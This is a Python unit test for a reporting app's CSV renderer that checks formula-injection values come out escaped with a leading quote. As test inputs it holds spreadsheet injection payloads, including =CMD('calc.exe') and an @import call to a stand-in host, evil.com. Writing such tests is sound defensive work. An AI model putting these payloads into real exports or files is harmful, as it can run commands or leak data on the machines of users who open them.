"""Unit Tests — CSV Formula Injection Prevention (Phase 4.0 Part 3 — Section 84, Test 7)."""

import csv
import io
import pytest
from app.services.renderers.csv_evidence_renderer import CSVEvidenceRenderer
from app.schemas.digital_trust_report_models import ReportDocumentDTO, TrustOverviewDTO, ReportFindingDTO, ReportEvidenceCardDTO


class TestCSVFormulaInjection:
    """Mandatory Test Case 7: Insert =CMD(...) into evidence text. Expected: CSV formula injection prevented."""

    def test_csv_formula_injection_escaped(self):
        r = CSVEvidenceRenderer()
        ov = TrustOverviewDTO(risk_score=50.0, risk_band="MODERATE_RISK")
        malicious_ev1 = ReportEvidenceCardDTO(card_id="=CMD('calc.exe')", title="+SUM(A1:A10)", category="-MIN(B1)", observation="@import('http://evil.com')")
        doc = ReportDocumentDTO(
            report_id="=1+1",
            analysis_id="@admin",
            generated_at="2026-08-14T00:00:00Z",
            trust_overview=ov,
            evidence_cards=[malicious_ev1],
        )

        out_bytes = r.render(doc)
        text = out_bytes.decode("utf-8")

        # Parse CSV rows
        reader = csv.reader(io.StringIO(text))
        rows = list(reader)
        # Row 1 is data row
        data_row = rows[1]

        # Verify all formula starters are escaped with a leading single quote '
        assert data_row[0].startswith("'=")  # report_id
        assert data_row[1].startswith("'@")  # analysis_id
        assert data_row[3].startswith("'=")  # evidence_id / card_id
        assert data_row[6].startswith("'-")  # category
